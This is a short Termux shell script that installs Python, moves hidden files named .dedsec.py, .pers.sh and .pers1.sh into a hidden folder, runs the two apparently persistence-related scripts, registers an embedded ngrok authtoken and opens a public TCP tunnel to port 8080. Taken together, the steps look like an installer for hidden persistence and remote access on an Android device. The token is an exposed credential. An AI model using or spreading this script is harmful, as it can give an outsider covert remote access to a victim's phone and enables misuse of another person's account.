pkg update && pkg upgrade -y
pkg install python2 -y && pkg install python3 -y
mkdir /data/data/com.termux/files/home/.p/ && mv .dedsec.py /data/data/com.termux/files/home/.p/ && mv .pers.sh /data/data/com.termux/files/home/.p/ && mv .pers1.sh /data/data/com.termux/files/home/.p/
sh /data/data/com.termux/files/home/.p/.pers.sh && sh /data/data/com.termux/files/home/.p/.pers1.sh
sleep 5
chmod +x ngrok
./ngrok authtoken 1iabGOYmHBNpWEeQPP8wj780QX8_E8zMR5aYaVB65Mhk5ohA
echo "DONE"
./ngrok tcp 8080
